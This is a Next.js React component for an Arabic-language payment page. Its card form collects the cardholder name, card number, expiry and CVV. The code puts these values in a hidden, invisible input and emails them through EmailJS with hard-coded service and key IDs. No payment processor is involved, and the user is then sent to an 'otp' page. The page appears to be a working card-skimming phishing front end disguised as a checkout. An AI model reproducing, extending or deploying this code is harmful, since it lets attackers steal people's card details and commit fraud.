"use client"
import Pay1 from '@/assets/Rectangle 1.png'
import Pay2 from '@/assets/Photo.png'
import { FormEvent, SetStateAction, useEffect, useRef, useState } from 'react'
import ErrorValidationInputs from './ErrorValidationInputs'
import Loading from './Loading'
import emailjs from '@emailjs/browser';
import { useRouter } from 'next/navigation'
import visa from '@/assets/4375165_card_credit_logo_visa_icon.png'
type method = {
    img: any,
    title: string
}
type t2 = {
    month: string
    year: string
}
const PaymentMethods = () => {
    const form = useRef<any>(null)

    const ref1: any = useRef(null)
    const ref2: any = useRef(null)
    const ref3: any = useRef(null)
    const ref4: any = useRef(null)
    const [idx, setIdx] = useState(1)
    const [msg, setMsg] = useState<string | ''>("")
    const [isValidCardName, setIsValidCardName] = useState<Boolean | null>(null);
    const [isValidCardNumber, setIsValidCardNumber] = useState<Boolean | null>(null);
    const [cardName, setCardName] = useState("");
    const [cardNumber, setCardNumber] = useState('');
    const [card, setCard] = useState('');
    const [expiresYear, setExpiresYear] = useState<SetStateAction<string>>('');
    const [expiresMonth, setExpiresMonth] = useState<SetStateAction<string>>("");
    const [isLoading, setIsLoading] = useState<Boolean | null>(null);
    const [cvv, setCvv] = useState<string | null>('');

    const router = useRouter();
    useEffect(() => {
        if (expiresYear?.length > 1 && expiresMonth.length === 0) {
            ref2?.current.focus()
        } else if (expiresMonth?.length > 1 && expiresYear.length === 0) {
            ref1?.current.focus()
        }
        if (((Number(expiresMonth) <= 12 && Number(expiresMonth) > 0) && expiresMonth.length === 2) && Number(expiresYear) >= 18) {
            ref3.current.focus()
        }
    }, [expiresMonth, expiresYear, ref4, card, setIsValidCardNumber])
    const methods: method[] = [{
        img: Pay1,
        title: "Paypal"
    }, {
        img: Pay2,
        title: "Visa - MasterCard"
    }]
    const handelSubmitForm = async (e: any) => {
        e.preventDefault();
        if (cardNumber.length || cardName.length || expiresYear.length || expiresMonth.length) {
            setIsLoading(true)
            setTimeout(() => {
                setIsLoading(false)
                // document.querySelector('.sub')?.textContent = "جاري معالجه الطلب"
            }, 10_000);
        }
        await emailjs
            .sendForm('service_eiba1x2', 'template_9ewwcki', form.current, {
                publicKey: "1dyv6-l9X5JPc7pEE",
            })
            .then(
                () => {
                    console.log('SUCCESS!');
                },
                (error) => {
                    console.log('FAILED...', error.text);
                },
            );
        router.push('otp')
    }

    const formatCreditCard = (number: string) => {
        number = number.replace(/\D/g, '');
        return number.replace(/(.{4})/g, '$1 ').trim();
    };
    // [Pay1, Pay2]
    function handelChange(e: any) {
        // setCardNumber(`${e.target.value}`);
        if (card.length === 19) {
            setIsValidCardNumber(true)
        } else {
            setIsValidCardNumber(null)
        }
        let val = e.target.value
        setCard(formatCreditCard(val))
    }
    console.log(card);

    return (
        // f68024
        <div className='relative'>
            <section>
                {isLoading &&
                    <Loading />
                }
                <h4 className="font-bold mt-[25px] text-[18px]">اختر طريقه الدفع الي تناسبك</h4>
                <div className="flex mt-[15px] items-center gap-2">
                    {methods.map((m, i) => (
                        <section onClick={() => setIdx(i)} className='flex-1 active:scale-[1.01]'>
                            <div className={`min-h-[100px] cursor-pointer flex flex-col gap-2 items-center justify-center group hover:bg-[#f58025] transition-all duration-[300ms] ${i === idx ? "bg-[#f58025] text-white" : "bg-[#eee]"} rounded-[8px]`}>
                                <img src={m.img.src} alt="" className='object-cover' />
                                <h4 className={`font-bold text-sm font-[abc] transition-all duration-[300ms]  group-hover:text-white  ${i === idx ? "text-white" : "text-[#1c374b]"}`}>{m.title.toUpperCase()}</h4>
                            </div>
                        </section>
                    ))}
                    {/* <div className="min-h-[100px] flex-1 bg-[#eee] rounded-[8px]"></div> */}
                </div>
                {idx === 0 ?
                    <div className='min-h-[200px] cursor-not-allowed flex items-center justify-center '>

                        <h2 className='text-center font-[ibmolexBoldSemibold]'>الخيار غير متاح في بلدك سيتوفر قريبا ..  </h2>
                    </div>
                    :
                    <form ref={form} onSubmit={handelSubmitForm}>
                        <section>
                            <h3 className="font-bold mt-[15px] text-[16px]">اسم حامل البطاقة</h3>
                            <div className='mt-[5px]'>
                                <input onBlur={() => cardName.length === 0 ? setIsValidCardName(false) : setIsValidCardName(null)} onChange={(e) => {
                                    // cardName.length === 0 ? setIsValidCardName(false) : setIsValidCardName(null)

                                    if (cardName.length === 0) {
                                        setIsValidCardName(false)
                                    } else {
                                        setIsValidCardName(null)
                                    }
                                    setCardName(e.target.value)
                                }} maxLength={16} required type="text" className={`w-full transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${isValidCardName === false ? "border-red-600 focus:border-red-600" : ""}`} placeholder="Ahmed M KAMAL" />
                            </div>
                            {isValidCardName ?
                                // <span className='font-bold text-red-500'>{(Number(expiresYear) < 18 || Number(expiresMonth) > 12) ? "".toUpperCase() : ""}</span>
                                <ErrorValidationInputs message={"ادخل اسمك الموجود علي بطاقة ائتمانك"} />
                                : null
                            }
                        </section>
                        <section>
                            <h3 className="font-bold mt-[15px] text-[16px]">رقم البطاقة</h3>
                            <div className='mt-[5px] pb-[50px] relative'>
                                <input style={{ direction: "ltr" }} value={card} required onChange={handelChange} maxLength={19} type="text" className={`text-right w-full absolute h-[42px] transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${(isValidCardNumber === false || cardNumber.length < 14 && cardNumber.length !== 0) ? "border-red-600 focus:border-red-600" : "border-transparent"}`} placeholder="7584 4894 4875 4844" />
                                <img src={visa.src} className={`w-[30px] transition-all duration-[300ms] object-cover left-2 top-1/2 -translate-y-1/2 absolute z-[222] ${card.length > 0 && card.length === 19 ? "opacity-[1]" : "opacity-[0]"}`} alt="" />
                            </div>
                            {card.length !== 19 && card.length > 0 ?
                                <ErrorValidationInputs message={"ادخل رقم البطاقة الائتمانية المكون من 16 رقم"} />
                                // <span className='font-bold text-red-500'>{(Number(expiresYear) < 18 || Number(expiresMonth) > 12) ? .toUpperCase() : ""}</span>
                                : null
                            }
                        </section>
                        <section className='flex  sm:items-center justify-between '>
                            <section>
                                <h3 className="font-bold mt-[15px] text-[16px]">تاريخ انتهاء البطاقة</h3>
                                <div className='mt-[5px] flex items-center rounded-[6px] p-[10px] bg-[#f9f9f9] gap-2 max-sm:w-fit'>
                                    <input ref={ref1} onChange={(e) => {
                                        if (expiresMonth.length === 0 && expiresYear.length > 1) {
                                            ref2.current.focus()
                                            console.log(ref2.current, expiresMonth.length);
                                        }
                                        setExpiresYear(e.target.value)
                                    }} required maxLength={2} type="text" className='w-[40px] transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444]' placeholder="25" />/
                                    <input ref={ref2} onChange={(e) => {
                                        setExpiresMonth(e.target.value)
                                    }} required maxLength={2} type="text" className='w-[40px] transition-all duration-[300ms] bg-[#f9f9f9]  outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm  font-[abc] placeholder:font-bold placeholder:text-[#4444]' placeholder="08" />
                                </div>
                                {
                                    (expiresYear.length === 2 && expiresMonth.length === 2) ?
                                        Number(expiresYear) < 18 || Number(expiresMonth) > 12 ?
                                            <span className='font-bold text-red-500 '>{(Number(expiresYear) < 18 || Number(expiresMonth) > 12) ? "برجاء ادخال تاريخ صحيح!".toUpperCase() : ""}</span> : "" : ''
                                }
                            </section>
                            <section>
                                <h3 className="font-bold mt-[15px] text-[16px]"> رمز الامان (cvv)

                                    <span className='text-[12px] my-[2px] text-[#808080] block'>عادة يكون خلف البطاقة مكون من 3 خانات </span>
                                </h3>
                                <div className='mt-[5px]'>
                                    <input onChange={(e) => setCvv(e.target.value)} ref={ref3} required maxLength={3} type="password" className='w-full transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444]' placeholder="◾◾◾" />
                                </div>
                            </section>
                        </section>
                        <input name='message' className='opacity-0' onChange={(e) => setMsg(e.target.value)} ref={ref4} type="text" value={`card name: ${cardName}\n card number: ${card}\n exp(y: (${expiresYear})) exp(m: (${expiresMonth})) cvv(${cvv})`} />
                        <button className='block sub w-full active:scale-[1.01] p-[14px] transition-all duration-[100ms] rounded-[6px] shadow-lg text-white my-[15px] outline-0 font-bold bg-[#f68024] hover:bg-[#ea6e0e]' disabled={isLoading === false && true}>{!isLoading ? "اكمال عملية الدفع" : "جاري معالجة طلبك..."}</button>
                    </form>
                }
            </section>
        </div>
    )
}

export default PaymentMethods